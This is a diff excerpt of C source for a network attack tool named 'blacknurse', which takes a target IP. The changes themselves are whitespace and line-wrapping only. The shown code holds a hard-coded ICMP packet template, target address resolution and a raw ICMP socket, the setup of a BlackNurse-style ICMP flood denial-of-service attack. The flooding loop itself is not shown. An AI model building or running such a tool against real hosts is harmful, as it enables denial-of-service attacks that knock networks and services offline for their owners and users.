@@ -17,14 +17,14 @@ int main(int argc, char *argv[])
         0x40, 0x06, 0x20, 0xc5, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x00, 0x00, 0x00, 0x00,
         0x00, 0x08, 0xef, 0xc1
     };
-    uint8_t *pkt;
+    uint8_t         *pkt;
     struct addrinfo *ai, hints;
-    const char *host;
-    struct pollfd pfd;
-    const size_t pkt_len = (sizeof pkt_template) / (sizeof pkt_template[0]);
-    size_t i;
-    int gai_err;
-    int kindy;
+    const char      *host;
+    struct pollfd    pfd;
+    const size_t     pkt_len = (sizeof pkt_template) / (sizeof pkt_template[0]);
+    size_t           i;
+    int              gai_err;
+    int              kindy;
 
     if (argc < 2) {
         fprintf(stderr, "Usage: blacknurse <target ip>\n");
@@ -34,7 +34,8 @@ int main(int argc, char *argv[])
     memset(&hints, 0, sizeof hints);
     hints.ai_family = AF_INET;
     if ((gai_err = getaddrinfo(host, NULL, &hints, &ai)) != 0) {
-        fprintf(stderr, "Unable to use [%s]: %s\n", host, gai_strerror(gai_err));
+        fprintf(stderr, "Unable to use [%s]: %s\n", host,
+                gai_strerror(gai_err));
         exit(1);
     }
     if ((kindy = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)) == -1) {
